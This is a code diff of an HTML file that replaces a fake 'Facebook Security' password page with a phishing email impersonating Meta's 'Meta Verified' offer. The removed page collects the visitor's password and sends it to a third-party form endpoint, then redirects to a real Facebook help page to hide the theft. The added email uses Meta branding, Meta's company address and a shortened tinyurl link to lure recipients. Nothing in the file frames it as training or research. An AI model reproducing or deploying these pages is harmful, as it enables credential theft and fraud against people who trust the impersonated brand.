@@ -1,199 +1,199 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Password Page</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>You're Invited to Meta Verified!</title>
     <style>
         body {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            line-height: 1.6;
+            color: #ffffff; /* All text white */
+            background-color: #1a1a1a; /* Dark background */
+            margin: 0;
+            padding: 20px 0;
+        }
+        .email-wrapper {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #1a1a1a; /* Dark background for the main content area */
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3); /* Slightly darker shadow */
+        }
+        .header-logo {
+            text-align: center;
+            padding: 20px 0 10px;
+        }
+        .header-logo img {
+            /* To make a typical white Meta logo visible on dark background */
+            filter: invert(100%) brightness(200%); /* Adjust for visibility if original logo is dark */
+            width: 120px;
+            height: auto;
+        }
+        .content-area {
+            padding: 0 30px 30px;
+            text-align: left;
+        }
+        .hero-banner {
+            background-color: #2a2a2a; /* Slightly lighter dark for banner */
+            padding: 20px 30px;
+            text-align: center;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #333; /* Darker border */
+        }
+        .hero-banner h1 {
+            font-size: 28px;
+            color: #007bff; /* Blue for Meta brand, stands out */
+            margin: 0 0 10px;
+            font-weight: bold;
+        }
+        .hero-banner p {
+            font-size: 18px;
+            color: #ccc; /* Lighter grey for subtitle */
             margin: 0;
         }
-
-        .container {
-            background-color: white;
-            padding: 40px 30px;
-            border-radius: 8px;
-            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
-            text-align: center;
-            width: 360px;
-            position: relative;
-        }
-
-        .logo {
-            margin-bottom: 20px;
-        }
-
-        .logo img {
-            width: 120px;
-        }
-
-        .header {
-            margin-bottom: 20px;
-            font-size: 18px;
-            color: #333;
-            font-weight: bold;
-        }
-
-        .form-group {
-            margin-bottom: 25px;
-            text-align: left;
-            position: relative;
-        }
-
-        .form-group label {
-            display: block;
-            font-weight: bold;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #606770;
-        }
-
-        .input-wrapper {
-            position: relative;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 14px;
-            padding-right: 40px;
-            /* Space for the eye icon */
-            border: 1px solid #ccd0d5;
-            border-radius: 6px;
-            font-size: 16px;
-            color: #1c1e21;
-            box-sizing: border-box;
-        }
-
-        .form-group input:focus {
-            border-color: #1877f2;
-            outline: none;
-            box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
-        }
-
-        .eye-icon {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
+        .section-title {
             font-size: 20px;
-            color: #606770;
-            cursor: pointer;
-            transition: color 0.3s ease;
-        }
-
-        .eye-icon:hover {
-            color: #1877f2;
-        }
-
-        .submit-button {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 6px;
-            font-size: 16px;
             font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
+            color: #ffffff; /* White title */
+            margin-bottom: 15px;
         }
-
-        .submit-button:hover {
+        p {
+            margin-bottom: 15px;
+            font-size: 16px;
+            color: #ffffff; /* All paragraph text white */
+        }
+        ul {
+            margin-left: 20px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            color: #ffffff; /* List items white */
+        }
+        li {
+            margin-bottom: 8px;
+            color: #ffffff; /* Individual list items white */
+        }
+        li strong {
+            color: #ffffff; /* Ensure bolded text in list items is also white */
+        }
+        .call-to-action {
+            margin-top: 30px;
+            text-align: center;
+        }
+        .button {
+            display: inline-block;
+            background-color: #1877f2; /* Facebook/Meta blue */
+            color: #ffffff !important;
+            padding: 15px 30px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 18px;
+            white-space: nowrap;
+            border: none;
+        }
+        .button:hover {
             background-color: #166fe5;
         }
+        .disclaimer-note {
+            font-size: 12px;
+            color: #ccc; /* Lighter grey for disclaimer */
+            margin-top: 40px;
+            padding: 15px;
+            background-color: #2a2a2a; /* Darker background for note */
+            border-radius: 5px;
+            border-left: 3px solid #555; /* Darker border for note */
+        }
+        .footer-text {
+            font-size: 12px;
+            color: #999; /* Slightly lighter grey for footer */
+            text-align: center;
+            padding: 20px 30px;
+            border-top: 1px solid #333; /* Darker border */
+            margin-top: 20px;
+        }
+        .footer-text a {
+            color: #0562e8; /* Blue links in footer */
+            text-decoration: none;
+        }
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
 
-        .error-message {
-            color: #e74c3c;
-            font-size: 14px;
-            margin-top: 5px;
-            margin-bottom: 15px;
-            text-align: left;
+        /* Responsive adjustments */
+        @media screen and (max-width: 600px) {
+            body {
+                padding: 0;
+            }
+            .email-wrapper {
+                border-radius: 0;
+            }
+            .content-area, .hero-banner, .footer-text {
+                padding: 20px 15px;
+            }
+            .hero-banner h1 {
+                font-size: 24px;
+            }
+            .hero-banner p {
+                font-size: 16px;
+            }
+            .section-title {
+                font-size: 18px;
+            }
+            p, ul, li {
+                font-size: 15px;
+            }
+            .button {
+                padding: 12px 25px;
+                font-size: 16px;
+            }
         }
     </style>
 </head>
-
 <body>
-    <div class="container">
-        <div class="logo">
-            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Logo">
-            <div class="header">
-                Facebook Security
-            </div>
-            <p>Please re-enter your password to complete the request.</p>
-            <form id="meta-form" action="https://submit-form.com/t8qWJyh70" method="POST">
-                <input type="hidden" name="_redirect" value="https://www.facebook.com/help/media/thank-you?rdrhc" />
-
-                <!-- Replace with your Access Key -->
-                <input type="hidden" name="access_key" value="22983eba-14f6-431b-8283-10e298027760">
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <div class="input-wrapper">
-                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
-                        <i class="eye-icon fas fa-eye" id="togglePassword"></i>
-                    </div>
-                    <span id="error-message" class="error-message"></span>
-                </div>
-                <button type="submit" class="submit-button">Submit</button>
-                <center>
-                    <font color="black">
-                        <font size="2">
-            </form>
+    <div class="email-wrapper">
+        <div class="header-logo">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yS/r/M1V4TjQ_gZ0.png" alt="Meta Logo" width="120" style="filter: invert(100%);">
         </div>
-        <script>
-            document.getElementById('togglePassword').addEventListener('click', function() {
-                var passwordField = document.getElementById('password');
-                var eyeIcon = this;
-                if (passwordField.type === 'password') {
-                    passwordField.type = 'text';
-                    eyeIcon.classList.remove('fa-eye');
-                    eyeIcon.classList.add('fa-eye-slash');
-                } else {
-                    passwordField.type = 'password';
-                    eyeIcon.classList.remove('fa-eye-slash');
-                    eyeIcon.classList.add('fa-eye');
-                }
-            });
 
-            document.getElementById('passwordForm').addEventListener('submit', function(event) {
-                var passwordField = document.getElementById('password');
-                var errorMessage = document.getElementById('error-message');
-                if (passwordField.value.length < 6) {
-                    errorMessage.textContent = 'Password must be at least 6 characters long.';
-                    event.preventDefault();
-                } else {
-                    errorMessage.textContent = '';
-                    // Perform form submission via Fetch API
-                    event.preventDefault(); // Prevent default form submission
+        <div class="hero-banner">
+            <h1>You're Invited to Meta Verified!</h1>
+            <p>Elevate your presence and enhance your authenticity on Facebook and Instagram.</p>
+        </div>
 
-                    var formData = new FormData(this);
-                    fetch(this.action, {
-                            method: 'POST',
-                            body: formData,
-                            headers: {
-                                'Accept': 'application/json'
-                            }
-                        })
-                        .then(response => {
-                            if (response.ok) {
-                                window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
-                            } else {
-                                errorMessage.textContent = 'There was an error. Please try again.';
-                            }
-                        })
-                        .catch(() => {
-                            errorMessage.textContent = 'There was an error. Please try again.';
-                        });
-                }
-            });
-        </script>
+        <div class="content-area">
+            <p>Dear [Your Name/Page Admin Name],</p>
+            <p>We're thrilled to invite you to join <strong>Meta Verified</strong>, a subscription bundle that includes a verified badge, proactive account protection, and access to enhanced account support. This invitation is extended to individuals who meet our eligibility criteria and are looking to strengthen their presence on our platforms.</p>
+
+            <h2 class="section-title">What Meta Verified Offers You:</h2>
+            <ul>
+                <li><strong>Verified Badge:</strong> A confirmed identity with an authentic badge.</li>
+                <li><strong>Proactive Account Protection:</strong> Secure your account from impersonation with continuous monitoring.</li>
+                <li><strong>Enhanced Account Support:</strong> Get help when you need it from a real person for common issues.</li>
+                <li><strong>Increased Visibility:</strong> Enjoy improved visibility in some areas of the platform.</li>
+            </ul>
+
+            <p>Ready to unlock these benefits and grow your authentic presence?</p>
+
+            <div class="call-to-action">
+                <a href="https://tinyurl.com/ytphaau6" class="button">Learn More & Get Verified</a>
+            </div>
+
+            <p style="margin-top: 30px;">Thank you for being a valued member of our community.</p>
+            <p>Sincerely,</p>
+            <p style="font-weight: bold;">The Meta Verified Team</p>
+
+            <div class="disclaimer-note">
+                **Note on Legitimacy:** Always verify the sender of emails before clicking links. Official Meta emails will come from legitimate Meta domains (e.g., @meta.com, @facebookmail.com). For any concerns, please navigate directly to the official Meta Verified page on Facebook or Instagram via the respective app or website.
+            </div>
+        </div>
+
+        <div class="footer-text">
+            This message was sent to you by Meta Platforms, Inc., 1 Hacker Way, Menlo Park, CA 94025, USA.
+            <br>
+            © 2025 Meta. <a href="https://www.facebook.com/policies/data_policy/">Privacy Policy</a> | <a href="https://www.facebook.com/terms.php">Terms of Service</a>
+        </div>
+    </div>
 </body>
-
 </html>
